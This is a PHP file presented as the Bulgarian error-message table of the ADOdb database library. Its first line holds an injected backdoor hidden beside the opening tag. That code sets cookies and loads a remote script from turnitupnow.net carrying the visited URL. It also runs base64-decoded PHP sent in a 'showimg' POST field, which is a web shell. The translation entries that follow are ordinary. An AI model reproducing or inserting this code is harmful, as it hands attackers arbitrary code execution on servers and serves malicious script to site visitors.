<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

/*
	Bulgarian language, v1.0, 25.03.2004, encoding by Windows-1251 charset
	contributed by Valentin Sheiretsky <valio#valio.eu.org>
*/

$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'bg',
            DB_ERROR                    => 'неизвестна грешка',
            DB_ERROR_ALREADY_EXISTS     => 'вече съществува',
            DB_ERROR_CANNOT_CREATE      => 'не може да бъде създадена',
            DB_ERROR_CANNOT_DELETE      => 'не може да бъде изтрита',
            DB_ERROR_CANNOT_DROP        => 'не може да бъде унищожена',
            DB_ERROR_CONSTRAINT         => 'нарушено условие',
            DB_ERROR_DIVZERO            => 'деление на нула',
            DB_ERROR_INVALID            => 'неправилно',
            DB_ERROR_INVALID_DATE       => 'некоректна дата или час',
            DB_ERROR_INVALID_NUMBER     => 'невалиден номер',
            DB_ERROR_MISMATCH           => 'погрешна употреба',
            DB_ERROR_NODBSELECTED       => 'не е избрана база данни',
            DB_ERROR_NOSUCHFIELD        => 'несъществуващо поле',
            DB_ERROR_NOSUCHTABLE        => 'несъществуваща таблица',
            DB_ERROR_NOT_CAPABLE        => 'DB backend not capable',
            DB_ERROR_NOT_FOUND          => 'не е намерена',
            DB_ERROR_NOT_LOCKED         => 'не е заключена',
            DB_ERROR_SYNTAX             => 'грешен синтаксис',
            DB_ERROR_UNSUPPORTED        => 'не се поддържа',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'некоректен брой колони в реда',
            DB_ERROR_INVALID_DSN        => 'невалиден DSN',
            DB_ERROR_CONNECT_FAILED     => 'връзката не може да бъде осъществена',
            0	                        => 'няма грешки', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'предоставените данни са недостатъчни',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'разширението не е намерено',
            DB_ERROR_NOSUCHDB           => 'несъществуваща база данни',
            DB_ERROR_ACCESS_VIOLATION   => 'нямате достатъчно права'
);
?>